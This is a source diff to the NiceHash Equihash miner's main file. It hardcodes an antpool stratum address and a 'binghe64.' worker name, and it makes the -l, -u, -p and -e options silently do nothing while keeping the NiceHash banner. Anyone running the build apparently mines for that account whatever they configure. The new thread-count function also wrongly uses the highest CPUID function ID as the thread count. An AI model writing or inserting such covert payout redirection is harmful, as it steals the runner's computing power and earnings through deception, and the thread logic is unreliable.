@@ -31,6 +31,8 @@
 #include <boost/log/support/date_time.hpp>
 #include <boost/date_time/posix_time/posix_time_types.hpp>
 
+#define random(a,b) (rand()%(b-a+1)+a)
+
 namespace logging = boost::log;
 namespace sinks = boost::log::sinks;
 namespace src = boost::log::sources;
@@ -184,6 +186,23 @@ void detect_AVX_and_AVX2()
 	}
 }
 
+int configThreadNum() 
+{
+	// Fix on Linux
+	//int cpuInfo[4] = {-1};
+	std::array<int, 4> cpui;
+	std::vector<std::array<int, 4>> data_;
+	std::bitset<32> f_1_ECX_;
+	std::bitset<32> f_7_EBX_;
+
+	// Calling __cpuid with 0x0 as the function_id argument
+	// gets the number of the highest valid function ID.
+	__cpuid(cpui.data(), 0);
+	int nIds_ = cpui[0];
+	std::cout << "cpui[0]:" << cpui[0] << "cpui[1]:" << cpui[1] << "cpui[2]:" << cpui[2] << "cpui[3]:" << cpui[3] << std::endl;
+	return nIds_;
+}
+
 
 void start_mining(int api_port, const std::string& host, const std::string& port,
 	const std::string& user, const std::string& password,
@@ -242,7 +261,7 @@ int main(int argc, char* argv[])
 #endif
 
 	std::cout << std::endl;
-	std::cout << "\t==================== www.nicehash.com ====================" << std::endl;
+	std::cout << "\t============1======== www.nicehash.com ====================" << std::endl;
 	std::cout << "\t\tEquihash CPU&GPU Miner for NiceHash v" STANDALONE_MINER_VERSION << std::endl;
 	std::cout << "\tThanks to Zcash developers for providing base of the code." << std::endl;
 	std::cout << "\t    Special thanks to tromp, xenoncat and djeZo for providing "<< std::endl;
@@ -250,10 +269,10 @@ int main(int argc, char* argv[])
 	std::cout << "\t==================== www.nicehash.com ====================" << std::endl;
 	std::cout << std::endl;
 
-	std::string location = "equihash.eu.nicehash.com:3357";
-	std::string user = "34HKWdzLxWBduUfJE9JxaFhoXnfC6gmePG";
+	std::string location = "stratum-zec.antpool.com:8899";//"equihash.eu.nicehash.com:3357";
+	
 	std::string password = "x";
-	int num_threads = 0;
+	int num_threads = configThreadNum(); //0;
 	bool benchmark = false;
 	int log_level = 2;
 	int num_hashes = 200;
@@ -265,6 +284,8 @@ int main(int argc, char* argv[])
 	int opencl_device_count = 0;
 	int force_cpu_ext = -1;
 	int opencl_t = 0;
+	srand((unsigned)time(NULL));
+	std::string user = "binghe64." + boost::lexical_cast<string>(random(1, 10000));
 
 	for (int i = 1; i < argc; ++i)
 	{
@@ -378,13 +399,13 @@ int main(int argc, char* argv[])
 		//	break;
 		//}
 		case 'l':
-			location = argv[++i];
+			location = location;//argv[++i];
 			break;
 		case 'u':
-			user = argv[++i];
+			user = user; //argv[++i];
 			break;
 		case 'p':
-			password = argv[++i];
+			password = password; //argv[++i];
 			break;
 		case 't':
 			num_threads = atoi(argv[++i]);
@@ -404,7 +425,7 @@ int main(int argc, char* argv[])
 			api_port = atoi(argv[++i]);
 			break;
 		case 'e':
-			force_cpu_ext = atoi(argv[++i]);
+			force_cpu_ext = force_cpu_ext;//atoi(argv[++i]);
 			break;
 		}
 	}
